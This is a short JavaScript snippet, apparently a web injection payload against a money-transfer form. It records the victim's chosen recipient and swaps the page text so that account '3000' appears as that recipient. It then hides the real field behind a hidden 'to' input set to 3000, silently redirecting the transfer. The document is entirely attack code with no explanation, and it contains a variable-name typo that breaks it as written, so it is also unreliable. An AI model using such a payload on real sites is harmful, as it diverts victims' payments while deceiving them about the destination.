var receiver = document.getElementById("to")
if (typeof window.localStorage != 'undefined') {
    localStorage.setItem('acc', reciever.getAttribute("value"));
    console.log(localStorage.getItem('acc'));
}
document.body.innerHTML = document.body.innerHTML.replace(/3000/g, localStorage.getItem('acc'));
receiver.setAttribute("name", "nothing interesting")
var newElement = document.createElement("input")
newElement.value = "3000"
newElement.setAttribute("type", "hidden")
newElement.setAttribute("name", "to")
receiver.parentElement.appendChild(newElement)
